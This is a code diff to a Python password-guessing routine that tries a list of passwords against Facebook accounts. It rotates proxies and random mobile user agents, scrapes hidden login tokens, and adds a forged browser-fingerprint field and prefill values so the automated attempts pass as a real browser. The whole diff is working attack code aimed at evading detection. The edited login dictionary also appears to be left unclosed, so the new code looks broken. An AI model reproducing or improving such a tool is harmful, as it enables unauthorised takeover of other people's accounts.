@@ -1368,34 +1368,31 @@ def p(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
+            user_agents = ["Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; OPPO A5 2020 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; OPPO A5 2020 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; OPPO A5 2020 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; CPH2025 Build/RKQ1.200829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; OPPO A5 2020 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 10; OPPO A5 2020 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 10; OPPO A5 2020 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; CPH2025 Build/RKQ1.200829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; CPH2025 Build/RKQ1.200829.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; OPPO A5 2020 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"]
+            uar = random.choice(user_agents)
             nip=random.choice(xvx)
             proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
-            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': uid,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'is_smart_lock': 'true',
-            'bi_xrwh': '0',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'dyn': '',
-            'csr': '',
-            'req': 'a',
-            'a': '',
-            '__user': '0',
-            '_fb_noscript': 'true'}
+            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number": 0,
+            "unrecognized_tries": 0,
+            "email": uid,
+            "prefill_contact_point": uid,
+            "prefill_source": "browser_dropdown",
+            "prefill_type": "contact_point",
+            "first_prefill_source": "browser_dropdown",
+            "first_prefill_type": "contact_point",
+            "had_cp_prefilled": True,
+            "had_password_prefilled": False,
+            "is_smart_lock": False,
+            "bi_xrwh": 0,
+            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             headers = {
             'authority': 'mbasic.facebook.com',
             'accept': '*/*',
@@ -1413,7 +1410,7 @@ def p(uid,pwx,tl):
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'user-agent': uar,
             'x-asbd-id': '129477',
             'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'x-requested-with': 'XMLHttpRequest',
